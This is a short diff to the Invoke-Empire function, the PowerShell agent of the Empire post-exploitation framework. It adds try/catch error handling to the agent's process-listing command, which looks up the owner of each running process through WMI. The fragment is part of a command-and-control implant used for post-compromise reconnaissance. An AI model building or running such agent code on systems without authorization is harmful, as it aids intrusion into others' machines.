@@ -350,7 +350,19 @@ function Invoke-Empire {
                 # this is stupid how complicated it is to get this information...
                 '(ps|tasklist)' {
                     $owners = @{};
-                    Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o};
+                    Get-WmiObject win32_process | ForEach-Object {
+                        try {
+                            $o = $_.getowner()
+                            if (-not $($o.User)) {
+                                $o = 'N/A'
+                            } else {
+                                $o = "$($o.Domain)\$($o.User)"
+                            }
+                        } catch {
+                            $o = 'N/A'
+                        }
+                        $owners[$_.handle] = $o
+                    }
                     if($cmdargs -ne '') { $p = $cmdargs }
                     else{ $p = "*" };
                     $output = Get-Process $p | ForEach-Object {
